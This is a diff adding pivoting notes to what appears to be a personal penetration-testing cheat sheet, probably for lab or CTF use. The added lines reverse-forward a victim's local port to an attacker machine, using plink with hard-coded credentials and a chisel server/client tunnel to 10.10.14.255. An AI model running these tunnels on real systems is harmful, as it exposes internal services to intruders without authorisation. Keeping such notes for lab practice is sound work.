@@ -253,3 +253,16 @@ rdesktop fullscreen:
 rdesktop -g 1100x900 -u admin -p lab -z -P -x 1 -r disk:share=/var/www/html 192.168.
 
 wmic service get Caption,StartName #get services running and the user they are running as
+
+If some service us running locally @ 127.0.0.1:8888 windows:
+Port Forwarding using plink:
+plink.exe -l kali -pw toor -R 8888:127.0.0.1:8888 attackermachine
+use netstat -ano | grep 8888  to confirm the port forward on your machine.
+
+Port Forwarding using chisel:
+First start server on attacker machine:
+./chisellinux server -p 8000 --reverse
+
+On victim machine tranfer chisel.exe and run:
+chisel.exe client 10.10.14.255:8000 R:8888:127.0.0.1:8888
+netstat -ano | grep 8000 to confirm the port forward on your machine.
